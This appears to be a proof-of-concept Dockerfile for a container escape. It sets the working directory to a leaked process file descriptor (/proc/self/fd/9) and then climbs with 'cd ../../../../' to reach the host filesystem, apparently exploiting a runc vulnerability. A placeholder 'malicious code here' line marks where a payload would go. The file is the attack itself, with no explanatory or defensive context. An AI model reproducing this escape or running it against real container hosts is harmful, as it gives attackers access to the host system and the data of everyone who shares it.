FROM ubuntu

WORKDIR /proc/self/fd/9/

RUN cd ../../../../ && \
    ls && \
    echo "malicious code here"
